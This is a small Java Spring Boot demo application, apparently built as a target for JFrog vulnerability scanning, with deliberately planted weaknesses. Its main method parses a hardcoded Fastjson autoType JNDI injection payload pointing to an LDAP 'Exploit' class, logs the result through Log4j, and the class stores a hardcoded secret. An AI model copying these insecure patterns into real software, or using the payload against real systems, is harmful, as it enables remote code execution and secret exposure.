package com.example.jfrog.demo;

import com.alibaba.fastjson.JSON;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

//import com.alibaba.fastjson.JSON;


@RestController
@SpringBootApplication
public class DemoApplication {

	private static String secretValue = "secr37Value";

	private static final Logger logger = LogManager.getLogger();

	@RequestMapping(value = "/helloTomcat")
	public String getHelloTomcat(){
		return "Hello Tomcat!";
	}

	@RequestMapping(value = "/helloJFrog")
	public String getHelloJFrog(){
		return "Hello JFrog!";
	}

	public static void main(String[] args) {
		String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
		JSON jsonObject = JSON.parseObject(payload);
		logger.info(jsonObject.toString());

		if (secretValue.equals("test")) {
			System.out.println("Secret exposed");
		}

		SpringApplication.run(DemoApplication.class, args);


	}

}
